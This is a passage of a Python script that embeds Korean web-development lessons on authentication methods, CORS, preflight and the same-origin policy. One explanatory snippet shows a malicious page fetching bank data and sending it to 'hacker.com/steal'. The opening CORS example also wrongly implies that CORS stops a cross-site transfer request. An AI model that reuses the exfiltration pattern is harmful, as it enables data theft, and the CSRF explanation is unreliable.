> **쿠키/세션, JWT, OAuth** - 상황에 맞는 인증 방식을 선택하세요!

---

## 🎯 한눈에 비교

```
┌────────────┬─────────────┬─────────────┬─────────────┐
│            │ 세션+쿠키    │    JWT      │   OAuth     │
├────────────┼─────────────┼─────────────┼─────────────┤
│ 저장 위치   │ 서버        │ 클라이언트   │ 외부 서비스  │
│ 확장성     │ 낮음        │ 높음        │ 높음        │
│ 보안      │ 좋음        │ 보통        │ 좋음        │
│ 무효화    │ 쉬움        │ 어려움       │ 외부 의존    │
│ 복잡도    │ 낮음        │ 중간        │ 높음        │
└────────────┴─────────────┴─────────────┴─────────────┘
```

### 방식별 특징

```
🍪 세션 + 쿠키
├── 서버가 상태 관리
├── 즉시 로그아웃 가능
├── 서버 메모리/저장소 필요
└── 단일 서버에 적합

🎟️ JWT
├── 클라이언트가 토큰 보관
├── 서버 조회 불필요
├── 토큰 탈취 시 만료까지 유효
└── 마이크로서비스에 적합

🔐 OAuth
├── 외부 서비스로 인증 위임
├── 비밀번호 관리 불필요
├── 소셜 로그인 구현
└── 외부 서비스 의존
```"""
            },
            {
                "type": "code",
                "title": "💻 상황별 선택 가이드",
                "content": """### 1. 단순 웹 서비스 → 세션

```javascript
// 전통적인 세션 기반 인증
// 장점: 단순, 안전, 즉시 로그아웃

const session = require('express-session');

app.use(session({
  secret: 'keyboard cat',
  resave: false,
  saveUninitialized: false,
  cookie: { secure: true, httpOnly: true }
}));

// 로그인
app.post('/login', (req, res) => {
  req.session.userId = user.id;
});

// 로그아웃 - 즉시 무효화!
app.post('/logout', (req, res) => {
  req.session.destroy();
});
```

### 2. API 서버 / 모바일 → JWT

```javascript
// JWT 기반 인증
// 장점: Stateless, 확장성, 다양한 클라이언트

const jwt = require('jsonwebtoken');

// Access + Refresh 토큰 발급
app.post('/login', (req, res) => {
  const accessToken = jwt.sign(
    { userId: user.id },
    ACCESS_SECRET,
    { expiresIn: '15m' }
  );

  const refreshToken = jwt.sign(
    { userId: user.id },
    REFRESH_SECRET,
    { expiresIn: '7d' }
  );

  // Refresh Token은 HttpOnly 쿠키로
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  });

  res.json({ accessToken });
});

// 토큰 갱신
app.post('/refresh', (req, res) => {
  const { refreshToken } = req.cookies;
  const payload = jwt.verify(refreshToken, REFRESH_SECRET);
  const newAccessToken = jwt.sign(
    { userId: payload.userId },
    ACCESS_SECRET,
    { expiresIn: '15m' }
  );
  res.json({ accessToken: newAccessToken });
});
```

### 3. 소셜 로그인 → OAuth

```javascript
// OAuth로 카카오/구글 로그인
// 장점: 비밀번호 관리 불필요, 사용자 편의

// 1. OAuth 로그인 후 → 내부 JWT 발급
app.get('/auth/kakao/callback', async (req, res) => {
  // 카카오에서 사용자 정보 획득
  const kakaoUser = await getKakaoUser(req.query.code);

  // 내부 사용자 생성/조회
  const user = await findOrCreateUser(kakaoUser);

  // 내부 JWT 발급 (이후엔 JWT로 인증)
  const token = jwt.sign({ userId: user.id }, SECRET);

  res.json({ token });
});
```

### 하이브리드: 세션 + JWT

```javascript
// 웹: 세션, API: JWT
// 하나의 서비스에서 둘 다 지원

// 웹 요청 - 세션 확인
app.use('/web', (req, res, next) => {
  if (req.session.userId) {
    req.user = { id: req.session.userId };
    return next();
  }
  res.redirect('/login');
});

// API 요청 - JWT 확인
app.use('/api', (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (token) {
    req.user = jwt.verify(token, SECRET);
    return next();
  }
  res.status(401).json({ error: 'Unauthorized' });
});
```"""
            },
            {
                "type": "tip",
                "title": "💡 선택 기준",
                "content": """### 프로젝트별 추천

```
📱 모바일 앱
└── JWT + OAuth (소셜 로그인)

🌐 단일 웹 서비스
└── 세션 + 쿠키

🏢 마이크로서비스
└── JWT (서비스 간 인증)

🛒 이커머스
└── 세션 (즉시 로그아웃 중요)

📊 SaaS / API 서비스
└── JWT + API Key

🎮 게임 / 앱
└── OAuth (간편 로그인)
```

### 보안 우선순위

```
1위: 세션 + 쿠키
├── 서버에서 상태 관리
├── 즉시 무효화 가능
└── HttpOnly로 XSS 방어

2위: JWT (올바르게 구현 시)
├── 짧은 만료 + Refresh Token
├── HttpOnly 쿠키 사용
└── 블랙리스트 구현

3위: OAuth
├── 외부 의존
├── 토큰 관리 복잡
└── 구현 실수 가능성
```

### 면접 답변 예시

```
Q: "어떤 인증 방식을 사용하시나요?"

A: "프로젝트 특성에 따라 선택합니다.

   단일 웹 서비스라면 세션을 선택합니다.
   즉시 로그아웃과 보안이 중요하기 때문입니다.

   API 서버나 마이크로서비스라면 JWT를
   선택합니다. Stateless하고 확장성이
   좋기 때문입니다.

   소셜 로그인이 필요하면 OAuth를 통해
   카카오/구글 로그인을 구현하고,
   내부적으로는 JWT를 발급합니다."
```

### 흔한 실수

```
❌ JWT를 localStorage에 저장
❌ 세션 ID 예측 가능하게 생성
❌ OAuth state 파라미터 미사용
❌ Refresh Token 클라이언트 노출
❌ HTTPS 미사용

✅ 올바른 구현:
├── 토큰/세션 ID 안전하게 보관
├── 충분한 랜덤성 확보
├── CSRF/XSS 방어
└── HTTPS 필수
```"""
            }
        ]
    }
}

# 06_CORS/보안 섹션 콘텐츠
CORS_CONTENTS = {
    "06_CORS/cors-concept": {
        "title": "CORS 개념",
        "description": "Cross-Origin Resource Sharing의 개념을 이해합니다",
        "sections": [
            {
                "type": "concept",
                "title": "🌐 CORS란?",
                "content": """## 🌐 한 줄 요약
> **다른 출처끼리 데이터 공유 허가증** - 브라우저의 보안 규칙이에요!

---

## 💡 왜 CORS가 필요한가?

### 문제 상황:
```
악성 사이트: evil.com
피해 사이트: bank.com

1. 사용자가 bank.com 로그인 (쿠키 저장)
2. 사용자가 evil.com 방문
3. evil.com의 JavaScript:
   fetch('https://bank.com/송금')

⚠️ 브라우저의 쿠키가 자동 전송됨!
└── 해커가 돈을 빼갈 수 있음!
```

### CORS로 해결:
```
브라우저: "evil.com에서 bank.com 요청하네?"
브라우저: "bank.com아, evil.com 허용해?"
bank.com: "아니요, 허용 안 합니다"
브라우저: "요청 차단!" ❌

→ 서버가 허용한 출처만 접근 가능!
```

---

## 🎯 출처(Origin)란?

### 출처의 구성:
```
https://www.example.com:443/path
  │          │           │
  │          │           └── 포트
  │          └── 호스트(도메인)
  └── 프로토콜(스킴)

출처 = 프로토콜 + 호스트 + 포트
```

### 같은 출처 vs 다른 출처:
```
기준: https://example.com

✅ 같은 출처 (Same-Origin)
https://example.com/page      (경로만 다름)
https://example.com/api/users (경로만 다름)

❌ 다른 출처 (Cross-Origin)
http://example.com            (프로토콜 다름)
https://api.example.com       (호스트 다름)
https://example.com:8080      (포트 다름)
https://example.org           (도메인 다름)
```

### CORS가 적용되는 상황
```
1. XMLHttpRequest / fetch API
2. 웹 폰트 (@font-face)
3. WebGL 텍스처
4. Canvas의 drawImage
5. CSS Shapes의 이미지

적용 안 됨:
├── <img src="...">
├── <script src="...">
├── <link href="...">
└── 폼 제출 (form action)
```"""
            },
            {
                "type": "code",
                "title": "💻 CORS 동작 방식",
                "content": """### 단순 요청 (Simple Request)

```
조건:
├── GET, HEAD, POST 중 하나
├── 허용된 헤더만 사용
│   └── Accept, Content-Type 등
├── Content-Type이 다음 중 하나:
│   ├── text/plain
│   ├── multipart/form-data
│   └── application/x-www-form-urlencoded
└── ReadableStream 미사용

단순 요청 흐름:
브라우저                         서버
    │                            │
    │── GET /api/data ─────────► │
    │   Origin: http://a.com     │
    │                            │
    │◄── 응답 ─────────────────── │
    │   Access-Control-Allow-    │
    │   Origin: http://a.com     │
```

### 프리플라이트 요청 (Preflight)

```
단순 요청 조건에 해당하지 않으면 → 프리플라이트

브라우저                         서버
    │                            │
    │── OPTIONS /api/data ─────► │ (사전 확인)
    │   Origin: http://a.com     │
    │   Access-Control-Request-  │
    │   Method: PUT              │
    │   Access-Control-Request-  │
    │   Headers: Content-Type    │
    │                            │
    │◄── 허용 여부 응답 ────────── │
    │   Access-Control-Allow-    │
    │   Origin: http://a.com     │
    │   Access-Control-Allow-    │
    │   Methods: GET, PUT, POST  │
    │                            │
    │── PUT /api/data ──────────► │ (실제 요청)
    │   (데이터 포함)              │
    │                            │
    │◄── 응답 ─────────────────── │
```

### Express CORS 설정

```javascript
const cors = require('cors');

// 모든 출처 허용 (개발용)
app.use(cors());

// 특정 출처만 허용 (운영용)
app.use(cors({
  origin: 'https://myapp.com',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true  // 쿠키 허용
}));

// 여러 출처 허용
app.use(cors({
  origin: ['https://app1.com', 'https://app2.com'],
}));

// 동적 출처 검증
app.use(cors({
  origin: (origin, callback) => {
    const allowedOrigins = ['https://app1.com', 'https://app2.com'];
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS 거부'));
    }
  }
}));
```"""
            },
            {
                "type": "tip",
                "title": "💡 CORS 에러 해결",
                "content": """### 흔한 에러 메시지

```
"Access to fetch at 'https://api.com'
from origin 'https://myapp.com'
has been blocked by CORS policy"

원인:
└── 서버가 CORS 헤더를 안 보냄

해결:
└── 서버에서 CORS 설정 추가
```

### 해결 방법

```
1. 서버에서 CORS 헤더 추가 (정석)
   Access-Control-Allow-Origin: *
   또는 특정 도메인

2. 프록시 서버 사용
   클라이언트 → 내 서버 → API 서버
   (서버 간엔 CORS 없음)

3. 개발 시 임시 해결
   ├── 브라우저 CORS 플러그인
   ├── --disable-web-security 옵션
   └── webpack devServer.proxy
```

### 개발 환경 프록시

```javascript
// React (package.json)
{
  "proxy": "http://localhost:5000"
}

// Vite (vite.config.js)
export default {
  server: {
    proxy: {
      '/api': 'http://localhost:5000'
    }
  }
}

// Next.js (next.config.js)
module.exports = {
  async rewrites() {
    return [{
      source: '/api/:path*',
      destination: 'http://localhost:5000/:path*'
    }];
  }
}
```

### 자주 하는 실수

```
❌ credentials: true + origin: '*'
└── 불가능! 특정 origin 명시 필요

❌ 프론트엔드에서 CORS 해결 시도
└── CORS는 서버에서만 해결 가능

❌ Access-Control-Allow-Origin 오타
└── 정확한 헤더명 확인

❌ OPTIONS 메서드 처리 안 함
└── 프리플라이트 요청 실패
```"""
            }
        ]
    },

    "06_CORS/cors-preflight": {
        "title": "Preflight 요청",
        "description": "CORS Preflight 요청의 동작을 이해합니다",
        "sections": [
            {
                "type": "concept",
                "title": "✈️ Preflight란?",
                "content": """## ✈️ 한 줄 요약
> **본 요청 전 사전 점검** - "이거 해도 돼요?" 미리 물어봐요!

---

## 💡 왜 Preflight가 필요한가?

### 비유:
```
비행기 이륙 전:
├── "이 비행기 안전한가요?"
├── "활주로 상태는요?"
└── 확인 후 이륙!

CORS 요청 전:
├── "이 요청 허용하나요?"
├── "이 헤더 써도 되나요?"
└── 확인 후 본 요청!
```

### Preflight가 필요한 이유:
```
1. 서버 보호
   └── 위험한 요청 사전 차단

2. 호환성
   └── CORS 미지원 서버 보호

3. 효율성
   └── 불필요한 요청 방지
```

---

## 🎯 Preflight 발생 조건

### 다음 중 하나라도 해당되면 발생:

```
1. HTTP 메서드가 GET, HEAD, POST 외
   ├── PUT
   ├── DELETE
   ├── PATCH
   └── OPTIONS (요청하는 경우)

2. 커스텀 헤더 사용
   ├── Authorization
   ├── X-Custom-Header
   └── 등등

3. Content-Type이 특수한 경우
   ├── application/json ⭐ (자주 발생)
   ├── application/xml
   └── text/html

4. ReadableStream 사용
```

### Preflight 흐름 상세:

```
┌────────────┐          ┌────────────┐
│  브라우저   │          │   서버     │
└─────┬──────┘          └─────┬──────┘
      │                       │
      │ OPTIONS /api/users    │
      │ Origin: https://a.com │
      │ Access-Control-       │
      │   Request-Method: PUT │
      │ Access-Control-       │
      │   Request-Headers:    │
      │   Content-Type,       │
      │   Authorization       │
      │──────────────────────►│
      │                       │
      │      204 No Content   │
      │ Access-Control-       │
      │   Allow-Origin: *     │
      │ Access-Control-       │
      │   Allow-Methods:      │
      │   GET,POST,PUT,DELETE │
      │ Access-Control-       │
      │   Allow-Headers:      │
      │   Content-Type,       │
      │   Authorization       │
      │ Access-Control-       │
      │   Max-Age: 86400      │
      │◄──────────────────────│
      │                       │
      │ PUT /api/users        │ (실제 요청)
      │──────────────────────►│
      │                       │
```"""
            },
            {
                "type": "code",
                "title": "💻 Preflight 처리하기",
                "content": """### Express에서 수동 처리

```javascript
// OPTIONS 요청 직접 처리
app.options('/api/*', (req, res) => {
  res.header('Access-Control-Allow-Origin', 'https://myapp.com');
  res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  res.header('Access-Control-Max-Age', '86400'); // 24시간 캐시
  res.sendStatus(204);
});

// 또는 cors 미들웨어 사용 (자동 처리)
const cors = require('cors');
app.use(cors({
  origin: 'https://myapp.com',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400,
  credentials: true
}));
```

### Python Flask

```python
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)

# 기본 설정
CORS(app)

# 상세 설정
CORS(app, resources={
    r"/api/*": {
        "origins": ["https://myapp.com"],
        "methods": ["GET", "POST", "PUT", "DELETE"],
        "allow_headers": ["Content-Type", "Authorization"],
        "max_age": 86400
    }
})

# 수동 처리
@app.route('/api/users', methods=['OPTIONS', 'PUT'])
def users():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'PUT'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return response

    # PUT 처리
    return {'success': True}
```

### Preflight 캐싱

```javascript
// 클라이언트 요청 예시
fetch('https://api.com/users', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token'
  },
  body: JSON.stringify({ name: 'Kim' })
});

// 서버 응답에 Max-Age 설정
// Access-Control-Max-Age: 86400

// 효과:
// 24시간 동안 같은 요청에 대해
// Preflight 없이 바로 본 요청 가능

// 브라우저별 최대값:
// Chrome: 2시간 (7200초)
// Firefox: 24시간
// Safari: 5분
```"""
            },
            {
                "type": "tip",
                "title": "💡 Preflight 최적화",
                "content": """### Preflight 줄이는 방법

```
1. Max-Age 설정
   └── 한 번 확인 후 캐싱

2. 단순 요청으로 바꾸기
   ├── GET/POST 사용
   ├── Content-Type 변경
   │   └── application/x-www-form-urlencoded
   └── 커스텀 헤더 제거

3. 프록시 사용
   └── 같은 출처로 요청
```

### 디버깅 방법

```
1. 개발자 도구 → Network 탭
2. OPTIONS 요청 찾기
3. Headers 확인:
   └── Request: Access-Control-Request-*
   └── Response: Access-Control-Allow-*

문제 확인:
├── OPTIONS 응답 코드가 200/204 아닌가?
├── Allow-Origin이 있는가?
├── Allow-Methods에 해당 메서드가 있는가?
└── Allow-Headers에 필요한 헤더가 있는가?
```

### 흔한 실수

```
❌ OPTIONS 메서드 미처리
app.put('/api/users', ...)  // PUT만 처리
// → OPTIONS 요청 404 에러

✅ 해결
app.options('/api/users', ...) // OPTIONS 추가
app.put('/api/users', ...)

또는 cors 미들웨어 사용

❌ Allow-Headers 누락
// Authorization 헤더 사용하는데
// Allow-Headers에 없음

✅ 해결
'Access-Control-Allow-Headers': 'Authorization'
```

### 성능 고려

```
Preflight 비용:
├── 추가 왕복 시간 (RTT)
├── 서버 부하 증가
└── 사용자 체감 지연

최적화:
├── Max-Age 최대로 설정
├── CDN에서 OPTIONS 캐싱
├── 가능하면 단순 요청 사용
└── API 설계 시 고려
```"""
            }
        ]
    },

    "06_보안/cors-solution": {
        "title": "CORS 해결 방법",
        "description": "CORS 문제의 다양한 해결 방법을 익힙니다",
        "sections": [
            {
                "type": "concept",
                "title": "🔧 CORS 해결하기",
                "content": """## 🔧 한 줄 요약
> **서버에서 헤더 추가 or 프록시 사용** - 상황에 맞는 해결책을 선택하세요!

---

## 🎯 해결 방법 총정리

### 1. 서버에서 CORS 헤더 추가 (정석)
```
가장 올바른 방법!

서버 응답에 추가:
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type
```

### 2. 프록시 서버 사용
```
내 프론트엔드 → 내 백엔드 → 외부 API

서버 ↔ 서버는 CORS 없음!
```

### 3. JSONP (구식)
```
<script> 태그는 CORS 제약 없음
GET 요청만 가능
보안 취약 → 사용 자제
```

### 상황별 선택:
```
┌────────────────────────┬────────────────┐
│ 상황                    │ 해결 방법       │
├────────────────────────┼────────────────┤
│ 내가 서버 소유          │ CORS 헤더 추가  │
│ 외부 API (CORS 없음)    │ 프록시 서버     │
│ 개발 환경              │ 개발 프록시     │
│ 테스트만               │ 브라우저 확장    │
└────────────────────────┴────────────────┘
```"""
            },
            {
                "type": "code",
                "title": "💻 프레임워크별 해결",
                "content": """### Express.js

```javascript
// npm install cors
const cors = require('cors');

// 간단 설정
app.use(cors());

// 상세 설정
app.use(cors({
  origin: ['https://myapp.com', 'https://admin.myapp.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['X-Total-Count'],
  credentials: true,
  maxAge: 86400
}));
```

### Spring Boot

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://myapp.com")
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("*")
            .allowCredentials(true)
            .maxAge(86400);
    }
}

// 또는 컨트롤러에 직접
@CrossOrigin(origins = "https://myapp.com")
@RestController
public class UserController { ... }
```

### Django

```python
# pip install django-cors-headers

# settings.py
INSTALLED_APPS = [
    'corsheaders',
    ...
]

MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',  # 맨 위에
    ...
]

# 설정
CORS_ALLOWED_ORIGINS = [
    "https://myapp.com",
]
CORS_ALLOW_CREDENTIALS = True
CORS_ALLOW_METHODS = ['GET', 'POST', 'PUT', 'DELETE']
```

### Nginx

```nginx
# nginx.conf
server {
    location /api/ {
        # CORS 헤더 추가
        add_header 'Access-Control-Allow-Origin' 'https://myapp.com';
        add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE';
        add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization';
        add_header 'Access-Control-Allow-Credentials' 'true';

        # Preflight 처리
        if ($request_method = 'OPTIONS') {
            add_header 'Access-Control-Max-Age' 86400;
            add_header 'Content-Length' 0;
            return 204;
        }

        proxy_pass http://backend;
    }
}
```

### 개발 환경 프록시

```javascript
// Vite
export default defineConfig({
  server: {
    proxy: {
      '/api': {
        target: 'https://external-api.com',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\\/api/, '')
      }
    }
  }
});

// Create React App (setupProxy.js)
const { createProxyMiddleware } = require('http-proxy-middleware');

module.exports = function(app) {
  app.use('/api', createProxyMiddleware({
    target: 'https://external-api.com',
    changeOrigin: true
  }));
};
```"""
            },
            {
                "type": "tip",
                "title": "💡 실전 해결 가이드",
                "content": """### 에러 메시지별 해결

```
에러: No 'Access-Control-Allow-Origin'
원인: 서버가 CORS 헤더 안 보냄
해결: 서버에 CORS 설정 추가

에러: Method not allowed
원인: Allow-Methods에 해당 메서드 없음
해결: 서버에서 메서드 허용

에러: Request header not allowed
원인: Allow-Headers에 헤더 없음
해결: 서버에서 헤더 허용

에러: Credentials not supported
원인: origin: '*' + credentials: true
해결: 특정 origin 명시
```

### 외부 API CORS 우회

```javascript
// 내 서버를 프록시로 사용

// 클라이언트
const response = await fetch('/api/external');

// 서버 (Express)
app.get('/api/external', async (req, res) => {
  const data = await fetch('https://external-api.com/data');
  res.json(await data.json());
});

// 서버 간 통신은 CORS 제약 없음!
```

### 보안 주의사항

```
❌ 절대 하면 안 되는 것
├── Access-Control-Allow-Origin: *
│   + credentials: true
├── 모든 origin 무조건 허용
└── 운영 환경에서 * 사용

✅ 올바른 방법
├── 특정 origin만 화이트리스트
├── 필요한 메서드/헤더만 허용
├── credentials 신중하게 사용
└── 로깅으로 CORS 요청 모니터링
```

### 디버깅 체크리스트

```
□ 서버에 CORS 미들웨어 있는가?
□ origin이 정확한가? (http vs https)
□ 포트 번호 포함했는가?
□ 필요한 메서드 허용했는가?
□ Content-Type 헤더 허용했는가?
□ Authorization 헤더 허용했는가?
□ OPTIONS 메서드 처리하는가?
□ credentials 설정 일치하는가?
```"""
            }
        ]
    },

    "06_보안/same-origin-policy": {
        "title": "동일 출처 정책",
        "description": "Same-Origin Policy의 개념과 중요성을 이해합니다",
        "sections": [
            {
                "type": "concept",
                "title": "🛡️ 동일 출처 정책이란?",
                "content": """## 🛡️ 한 줄 요약
> **다른 출처의 데이터는 못 읽어!** - 브라우저가 지켜주는 보안 규칙이에요!

---

## 💡 왜 필요한가?

### 만약 이 정책이 없다면?
```
시나리오:

1. 사용자가 bank.com 로그인
2. 새 탭에서 evil.com 방문
3. evil.com의 JavaScript:

   // bank.com의 데이터를 마음대로 읽음!
   fetch('https://bank.com/내계좌정보')
     .then(res => res.json())
     .then(data => {
       // 해커 서버로 전송
       fetch('https://hacker.com/steal', {
         body: JSON.stringify(data)
       });
     });

😱 계좌 정보 유출!
```

### 동일 출처 정책으로 보호:
```
브라우저: "evil.com에서 bank.com 데이터 요청?"
브라우저: "출처가 다르네!"
브라우저: "읽기 차단!" ❌

→ JavaScript가 다른 출처 데이터를 읽을 수 없음!
```

---

## 🎯 출처(Origin) 구성

```
https://www.example.com:443/path/page.html
└──┬──┘ └───────┬───────┘└─┬┘
   │            │          │
프로토콜    호스트       포트

출처 = 프로토콜 + 호스트 + 포트
(경로는 포함 안 됨!)
```

### 출처 비교 예시:

```
기준: https://store.example.com/products

https://store.example.com/cart     ✅ 같음 (경로만 다름)
http://store.example.com/products  ❌ 다름 (프로토콜)
https://api.example.com/products   ❌ 다름 (서브도메인)
https://store.example.com:8080     ❌ 다름 (포트)
https://store.example.org          ❌ 다름 (도메인)
```

### 제한되는 것들:
```
❌ 다른 출처로의 요청/응답 읽기
❌ 다른 출처의 DOM 접근
❌ 다른 출처의 Storage 접근
❌ 다른 출처의 쿠키 접근

⭕ 허용되는 것 (역사적 이유):
├── <img src="다른출처">
├── <script src="다른출처">
├── <link href="다른출처">
├── <form action="다른출처">
└── 쓰기(전송)는 되지만 읽기는 불가
```"""
            },
            {
                "type": "code",
                "title": "💻 SOP 동작 확인",
                "content": """### 차단되는 경우

```javascript
// a.com에서 실행

// ❌ 다른 출처 API 호출 (CORS 없으면)
fetch('https://b.com/api/data')
  .then(res => res.json())  // 여기서 에러!
  .catch(err => console.log('차단됨!'));

// ❌ 다른 출처 iframe의 DOM
const iframe = document.querySelector('iframe');
// iframe.src = 'https://b.com'
iframe.contentDocument;  // 에러!

// ❌ 다른 출처 window의 정보
const popup = window.open('https://b.com');
popup.document;  // 에러!
popup.location.href;  // 에러!

// ❌ 다른 출처 Storage
localStorage.setItem('key', 'value');  // a.com 전용
// b.com에서는 이 값에 접근 불가
```

### 허용되는 경우

```javascript
// 삽입(Embedding)은 허용
// 단, 읽기는 불가

// ✅ 이미지 로드 (표시만, 픽셀 읽기 불가)
const img = new Image();
img.src = 'https://b.com/image.png';

// ✅ 스크립트 실행 (전역 스코프 공유)
const script = document.createElement('script');
script.src = 'https://b.com/script.js';
// 실행은 되지만 응답 내용 읽기 불가

// ✅ 폼 전송 (응답 읽기 불가)
const form = document.createElement('form');
form.action = 'https://b.com/submit';
form.method = 'POST';
form.submit();  // 전송은 되지만 응답 못 읽음

// ✅ 쓰기 요청 (응답 읽기 불가)
// fetch로 POST는 되지만 응답 읽기 차단
fetch('https://b.com/api', {
  method: 'POST',
  body: JSON.stringify(data)
});
// .then(res => res.json()) 여기서 차단
```

### 같은 출처 확인

```javascript
// 현재 출처 확인
console.log(window.origin);
// 또는
console.log(window.location.origin);
// 예: "https://example.com"

// 출처 비교 함수
function isSameOrigin(url) {
  try {
    const targetOrigin = new URL(url).origin;
    return window.origin === targetOrigin;
  } catch (e) {
    return false;  // 잘못된 URL
  }
}

isSameOrigin('https://example.com/page');  // true
isSameOrigin('https://api.example.com');   // false
```"""
            },
            {
                "type": "tip",
                "title": "💡 SOP 우회 방법 (합법적)",
                "content": """### 1. CORS (표준 방법)

```
서버가 명시적으로 허용

Access-Control-Allow-Origin: https://a.com

→ "a.com은 우리 데이터 읽어도 돼요"
```

### 2. document.domain (같은 상위 도메인)

```javascript
// a.example.com 과 b.example.com

// 양쪽 페이지에서:
document.domain = 'example.com';

// 이제 서로 접근 가능!
// ⚠️ 보안상 권장하지 않음
// Chrome에서 지원 중단 예정
```

### 3. postMessage (안전한 통신)

```javascript
// 부모 페이지 (a.com)
const iframe = document.querySelector('iframe');
iframe.contentWindow.postMessage(
  { type: 'greeting', data: 'hello' },
  'https://b.com'  // 수신자 지정
);

// iframe 페이지 (b.com)
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://a.com') return;
  console.log(event.data);  // { type: 'greeting', data: 'hello' }
});

// ⭐ 가장 안전한 방법!
```

### 4. 프록시 서버

```
클라이언트 (a.com)
    │
    ↓ 같은 출처 요청
백엔드 (a.com/api)
    │
    ↓ 서버 간 요청 (SOP 없음)
외부 API (b.com)

→ SOP는 브라우저만 적용!
```

### 보안 요약

```
SOP의 핵심:
├── 읽기 차단 (다른 출처 데이터)
├── 쓰기 허용 (일부)
└── 삽입 허용 (img, script 등)

CORS의 역할:
└── SOP를 합법적으로 우회
    서버가 허용한 출처만!

결론:
└── SOP = 기본 보안
    CORS = 필요시 허용
```"""
            }
        ]
    }
}

def update_network_json():
    """network.json 파일 업데이트"""
    import sys
    sys.stdout.reconfigure(encoding='utf-8')

    # 파일 읽기
    with open(NETWORK_JSON_PATH, 'r', encoding='utf-8') as f:
        data = json.load(f)

    # 모든 콘텐츠 통합
    all_contents = {}
    all_contents.update(AUTH_CONTENTS)
    all_contents.update(CORS_CONTENTS)

    updated_count = 0

    for key, content in all_contents.items():
        if key in data:
            data[key]['title'] = content['title']
            data[key]['description'] = content['description']
            data[key]['sections'] = content['sections']
            data[key]['isPlaceholder'] = False
            updated_count += 1
            print(f"[OK] {key} updated")
        else:
            print(f"[WARN] {key} key not found")

    # 파일 저장
    with open(NETWORK_JSON_PATH, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

    print(f"\n[DONE] Auth & CORS sections updated: {updated_count} topics")

if __name__ == "__main__":
    update_network_json()
